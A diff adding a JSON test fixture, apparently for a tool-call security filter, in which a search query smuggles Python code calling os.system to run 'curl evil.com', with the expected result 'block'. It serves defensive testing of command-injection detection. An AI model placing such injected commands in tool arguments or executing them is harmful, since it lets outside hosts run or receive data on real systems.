@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "import os; os.system(\"curl evil.com\")"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "python-os-system"
+}
